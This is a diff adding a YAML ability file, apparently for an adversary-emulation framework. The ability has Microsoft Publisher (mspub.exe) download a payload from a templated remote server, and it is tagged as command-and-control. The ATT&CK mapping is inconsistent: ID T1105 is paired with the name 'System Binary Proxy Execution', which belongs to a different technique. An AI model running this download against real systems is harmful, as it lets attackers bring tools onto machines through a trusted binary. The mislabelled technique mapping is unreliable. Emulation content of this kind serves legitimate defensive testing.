@@ -1,0 +1,21 @@
+- id: 47a8c93e-3c53-9a61-3293-2dfc353ad943
+  name: Mspub.exe - Downloads payload from remote server
+  description: Downloads payload from remote server
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: System Binary Proxy Execution
+  platforms:
+    windows:
+      cmd:
+        command: 'mspub.exe #{server}/file/download'
+  singleton: false
+  privilege: User
+  repeatable: true
+  buckets:
+  - command-and-control
+  version: '1.0'
+  author: Nir Chako
+  created: '2022-08-02'
+  modified: '2022-08-02'
+  operating_system: Windows All Versions
